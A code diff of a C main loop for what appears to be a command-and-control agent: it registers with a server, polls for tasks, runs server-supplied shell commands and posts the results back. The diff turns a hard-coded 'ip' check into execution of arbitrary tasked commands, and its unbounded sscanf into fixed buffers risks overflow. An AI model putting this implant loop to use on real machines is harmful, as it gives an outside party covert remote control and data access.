@@ -10,7 +10,7 @@
 int main(void)
 {
     struct strings_array sa = { NULL, NULL, 0};
-    struct agent_info agent = {{'\0'}, {'\0'}, {'\0'}, {'\0'}};
+    struct agent_info agent = {{'\0'}, {'\0'}, {'\0'}, {'\0'}, {'\0'}, false};
     struct tasks task = { {'\0'}, {'\0'}, {'\0'}, {'\0'}, NULL, 0, 1};
  
     bool host_info_gathered = false;
@@ -34,7 +34,6 @@ int main(void)
             puts("Registered\n");
             registered = true;
 	        printf("The data returning from agent registration main is %s\n\n", sa.response);
-        // WILL NEED TO FREE sa.response and memset for each time I want to reuse!!
             continue;
         } else {
             puts("Not Registered, trying again\n");
@@ -48,8 +47,14 @@ int main(void)
 
     while(true) {
         puts("Checking tasks\n");
-        check_tasks(&agent, &sa);
-        parse_tasks(sa.response, &task);
+        if(!check_tasks(&agent, &sa)) {
+            puts("No tasks during check in.\n");
+            continue;
+        }
+        if(!parse_tasks(sa.response, &task)) {
+            puts("Tasks not parsed successfully.\n");
+            continue;
+        }
 
         // char line[1024] = { '\0' };
         for (unsigned int i = 0; i < task.sz; i++) {
@@ -59,30 +64,50 @@ int main(void)
             sscanf(task.strings[i], "%s %s %s %s", task.id, task.type, task.cmd, task.args);
             printf("Tasks ID: %s\n", task.id);
             printf("Tasks Type: %s\n", task.type);
-            printf("Tasks Arg: %s\n", task.cmd);
+            printf("Tasks Cmd: %s\n", task.cmd);
             printf("Tasks Arg: %s\n", task.args);
             puts(" \n");
-        }
+            // Eventually check_tasks will return the task type and
+            // specific task. An if block will be added here to
+            // check if task type is cmd, if so, run the cmd commands.
+            if(can_run_cmd(task.cmd)) {
+                puts("Command exists\n");
+                if(run_cmd(&sa, &task)) {
+                    // printf("%s", sa.words);
+                    post_results(&sa);
+                }
 
-        // Eventually check_tasks will return the task type and
-        // specific task. An if block will be added here to
-        // check if task type is cmd, if so, run the cmd commands.
-        if(can_run_cmd("ip")) {
-            puts("Command exists\n");
-            if(run_cmd(&sa)) {
-                // printf("%s", sa.words);
-                post_results(&sa);
+            } else {
+                puts("Command does not exist\n");
+                continue;
+
+
             }
 
-        } else {
-            puts("Command does not exist\n");
-            continue;
 
+
+            memset(task.id, 0, sizeof(task.id));
+            memset(task.type, 0, sizeof(task.type));
+            memset(task.cmd, 0, sizeof(task.cmd));
+            memset(task.args, 0, sizeof(task.args));
 
         }
 
         // remember to destroy sa.words at some point.
-        sleep(10);
+
+
+        free(sa.response);
+        destroy(&task);
+
+        sa.results = NULL;
+        sa.response = NULL;
+        sa.size = 0;
+
+        task.sz = 0;
+
+
+
+        sleep(30);
     }
         
 }
